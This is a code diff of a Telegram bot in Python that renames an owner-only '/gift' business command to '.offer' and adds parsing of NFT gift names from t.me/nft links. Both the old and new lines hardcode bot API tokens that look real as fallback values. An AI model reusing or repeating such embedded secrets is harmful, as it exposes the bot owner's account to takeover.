@@ -17,7 +17,7 @@ from telebot.types import (
 
 # ─────────────────────── НАСТРОЙКИ ───────────────────────
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8818760623:AAHYXeTxedyi23QP7BYRRDucqyYsIcr1L9o")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvdTdJ02Bo")
 OWNER_ID = 861423393
 VERIFY_TIMEOUT_SECONDS = 300
 DB_FILE = "users_db.json"
@@ -28,7 +28,7 @@ EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
 EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
 EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
 
-# ─────────────────────── БАЗА ДАННЫХ (JSON) ───────────────────────
+# ─────────────────────── БАЗА ДАННЫХ ───────────────────────
 
 def load_db():
     if os.path.exists(DB_FILE):
@@ -89,11 +89,32 @@ def normalize_url(raw):
     if raw.startswith(("t.me/", "telegram.me/")): return f"https://{raw}"
     return f"https://t.me/{raw.lstrip('/')}"
 
-def parse_gift_command(text):
-    body = text.replace("/gift", "", 1).strip()
+def extract_name_from_url(url):
+    """Достает название подарка из ссылки вида t.me/nft/PetSnake-149950"""
+    match = re.search(r'/nft/([a-zA-Z]+)-(\d+)', url)
+    if match:
+        raw_name = match.group(1)
+        numbers = match.group(2)
+        # PetSnake -> Pet Snake
+        name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
+        return f"{name_with_spaces} #{numbers}"
+    
+    # Если ссылка без цифр (на всякий случай)
+    match_only_name = re.search(r'/nft/([a-zA-Z]+)', url)
+    if match_only_name:
+        raw_name = match_only_name.group(1)
+        return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
+        
+    return "Подарок"
+
+def parse_offer_command(text):
+    """Убирает префикс .offer или . offer и разбирает аргументы."""
+    body = re.sub(r'^\.\s*offer\s*', '', text, flags=re.IGNORECASE).strip()
     if not body: return None
+
     quoted = re.findall(r'"([^"]*)"', body)
     without_quotes = re.sub(r'"[^"]*"', "", body).strip()
+
     if len(quoted) >= 2:
         name = quoted[0]
         url = normalize_url(quoted[1])
@@ -105,10 +126,17 @@ def parse_gift_command(text):
         amount_part = rest[1] if len(rest) >= 2 else ""
     else:
         parts = body.split()
-        if len(parts) < 3: return None
-        name = parts[0]
-        url = normalize_url(parts[1])
-        amount_part = parts[2]
+        if len(parts) == 1:
+            return None
+        elif len(parts) == 2:
+            url = normalize_url(parts[0])
+            amount_part = parts[1]
+            name = extract_name_from_url(url)
+        else:
+            name = " ".join(parts[:-2])
+            url = normalize_url(parts[-2])
+            amount_part = parts[-1]
+
     amount = re.sub(r"\D", "", amount_part) if amount_part else ""
     if not url or not amount: return None
     return name, url, amount
@@ -122,6 +150,8 @@ def parse_inline_query(raw):
             url_raw = url_match.group(1)
             name = text[:url_match.start()].strip()
             amount_raw = text[url_match.end():].strip()
+            if not name:
+                name = extract_name_from_url(normalize_url(url_raw))
         else:
             words = text.split()
             if len(words) >= 3:
@@ -136,6 +166,8 @@ def parse_inline_query(raw):
         amount_raw = parts[2] if len(parts) > 2 else ""
     amount = re.sub(r"\D", "", amount_raw)
     url = normalize_url(url_raw) if url_raw else ""
+    if not name and url:
+        name = extract_name_from_url(url)
     return name, url, amount
 
 # ─────────────────────── ТЕКСТЫ ───────────────────────
@@ -256,11 +288,14 @@ def handle_business_message(message):
     conn_id = message.business_connection_id
     sender_id = message.from_user.id
     if sender_id != OWNER_ID: return
-    if not message.text.startswith("/gift"): return
+    
+    text_lower = message.text.strip().lower()
+    if not (text_lower.startswith(".offer") or text_lower.startswith(". offer")):
+        return
 
-    parsed = parse_gift_command(message.text)
+    parsed = parse_offer_command(message.text)
     if not parsed:
-        send_business_message(message.chat.id, "❌ Неверный формат команды.", conn_id)
+        send_business_message(message.chat.id, "❌ Неверный формат команды.\n\nИспользуй: .offer \"Название\" \"ссылка\" 100\nИли: .offer ссылка 100", conn_id)
         return
 
     name, url, amount = parsed
